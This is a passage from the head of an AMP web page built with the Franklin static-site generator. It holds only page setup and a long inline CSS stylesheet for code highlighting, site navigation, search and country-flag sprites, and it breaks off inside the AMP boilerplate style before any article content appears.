<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=ur><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 